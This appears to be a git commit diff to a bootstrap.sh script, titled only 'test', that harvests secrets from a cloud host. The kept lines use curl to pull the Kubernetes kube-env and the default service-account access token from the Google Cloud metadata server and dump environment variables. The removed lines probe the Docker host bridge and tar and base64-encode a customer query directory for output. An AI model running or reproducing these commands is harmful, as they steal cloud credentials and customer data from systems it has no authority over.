e52394066b8009bffcde615c927c003f686fd0a2
boo7 <boo7>
2019-01-16 21:40:37 +0100

    test

--- bootstrap.sh
+++ bootstrap.sh
@@ -10,14 +10,4 @@ curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/attribute
 
 curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json'
 curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json'
-mount
-
-curl -vv 'http://172.17.0.1/'
-curl -vv 'http://172.17.0.1:8443/'
-
-
 env
-echo "/opt search :"
-cat /opt/dist/autocomplete.sh
-tar cvfz /tmp/temp.tgz /opt/dist/queries/customer
-cat /tmp/temp.tgz | base64
